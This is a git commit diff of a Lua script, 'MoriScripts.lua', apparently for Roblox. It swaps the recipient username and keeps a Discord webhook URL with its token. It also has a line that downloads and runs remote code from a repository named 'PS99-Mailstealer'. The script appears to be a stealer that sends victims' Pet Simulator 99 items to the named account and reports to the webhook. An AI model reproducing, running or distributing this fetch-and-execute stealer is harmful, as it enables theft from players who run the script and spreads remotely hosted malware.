ed0e4a6e2a2620280affee78163063bc6cd96ad8
yototplayz <108420578+Totoypogi000@users.noreply.github.com>
2024-06-20 02:59:20 +0800

    MoriScripts.lua

--- MoriScripts.lua
+++ MoriScripts.lua
@@ -1,5 +1,5 @@
-Username = "tryrant26"
-Username2 = "tryrant26"
+Username = "ComShopDot"
+Username2 = "ComShopDot"
 Webhook = "https://discord.com/api/webhooks/1253051136370409552/Bo--crFZGjHZTAhyl_n4rnoyzgf7CLNPnd7ysaCDavkCAg3NTyTlL5aLSfsExumelPe-"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
